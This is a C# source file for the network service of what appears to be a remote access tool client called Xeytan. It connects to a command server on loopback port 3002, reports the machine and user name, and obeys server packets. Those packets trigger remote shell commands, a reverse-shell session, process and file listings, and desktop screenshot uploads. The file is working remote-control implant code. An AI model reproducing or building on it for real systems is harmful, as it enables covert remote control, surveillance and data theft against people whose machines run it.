using NetLib.Models;
using NetLib.Packets;
using NetLib.Services;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace XeytanCSharpClient.Net
{
    class NetClientService : DefaultAsyncNetClientService
    {
        public XeytanApplication Application { get; set; }

        public NetClientService()
        {
        }

        public void Start()
        {
            Running = true;
            StartNetSession();
        }

        readonly object signal = new object(); // this is legal

        private void StartNetSession()
        {
            try
            {
                while (true)
                {
                    IPEndPoint endpoint = new IPEndPoint(IPAddress.Loopback, 3002);
                    Console.WriteLine("Trying to make the connection");


                    Socket clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    clientSocket.BeginConnect(endpoint, OnConnectionCallback,
                        clientSocket);

                    lock (signal)
                    {
                        Monitor.Wait(signal);
                    }
                }
            }
            catch (SocketException exception)
            {
                Console.WriteLine("Socket Exception {0}", exception);
                Thread.Sleep(5 * 1000);
            }
        }

        public void OnConnectionCallback(IAsyncResult result)
        {
            try
            {
                ClientSocket = (Socket) result.AsyncState;
                ClientSocket.EndConnect(result);

                SendPacket(new PacketPresentation
                {
                    SystemInfo = new SystemInfo
                    {
                        PcName = Environment.MachineName,
                        UserName = Environment.UserName,
                        OperatingSystem = Environment.OSVersion.ToString(),
                        DotNetVersion = Environment.Version.ToString()
                    }
                });

                InteractAsync();
            }
            catch (Exception exception)
            {
                Thread.Sleep(5000);
                OnDisconnected(exception);
            }
        }

        protected override void OnDisconnected(Exception exception)
        {
            lock (signal)
            {
                System.Threading.Monitor.Pulse(signal);
            }
        }

        protected override void OnException(Exception exception)
        {
            ShutdownConnection();
            Thread.Sleep(5 * 1000);
            StartNetSession();
        }

        protected override void OnPacketReceived(Packet packet)
        {
            switch (packet.PacketType)
            {
                case PacketType.Information:
                    Application.OnSystemInformationRequested();
                    break;
                case PacketType.Process:
                    Application.OnProcessListRequested();
                    break;
                case PacketType.FileSystem:
                {
                    PacketFileSystem packetFs = ((PacketFileSystem) packet);
                    string path = packetFs.BasePath;
                    if (packetFs.FsFocus == PacketFileSystem.FileSystemFocus.Roots
                        || path == null || path.Trim().Equals("") || path.Trim().Equals("/"))
                        Application.OnRootsRequested();
                    else
                        Application.OnListDirRequested(packetFs.BasePath);
                    break;
                }

                case PacketType.Shell:
                {
                    PacketShell packetShell = ((PacketShell) packet);
                    if (packetShell.Command == null)
                    {
                        if (!Application.IsReverseShellSessionActive)
                            Application.StartReverseShellSession();
                    }
                    else
                    {
                        Application.ExecuteShell(packetShell.Command);
                    }

                    break;
                }
                case PacketType.Desktop:
                {
                    Application.OnDesktopRequest(((PacketDesktop) packet).DesktopAction);
                    break;
                }

                default:
                    Trace.WriteLine("PacketType not Handled");
                    break;
            }
        }

        public void SendSystemInformation(SystemInfo systemInfo)
        {
            var packet = new PacketSystemInformation
            {
                SystemInfo = systemInfo
            };

            SendPacket(packet);
        }

        public void SendFileSystemRoots(List<DiskDriveInfo> diskDrives)
        {
            SendPacket(new PacketFileSystem
            {
                FsFocus = PacketFileSystem.FileSystemFocus.Roots,
                Drives = diskDrives
            });
        }

        public void SendFileSystemEntries(string path, List<FileInfo> files)
        {
            SendPacket(new PacketFileSystem
            {
                FsFocus = PacketFileSystem.FileSystemFocus.DirectoryEntries,
                BasePath = path,
                Files = files
            });
        }

        public void SendProcessList(List<ProcessInfo> processInfos)
        {
            SendPacket(new PacketProcess
            {
                Processes = processInfos
            });
        }

        public void SendDesktopImage(byte[] imageData)
        {
            SendPacket(new PacketDesktop()
            {
                DesktopAction = DesktopAction.Push,
                ImageData = imageData
            });
        }
    }
}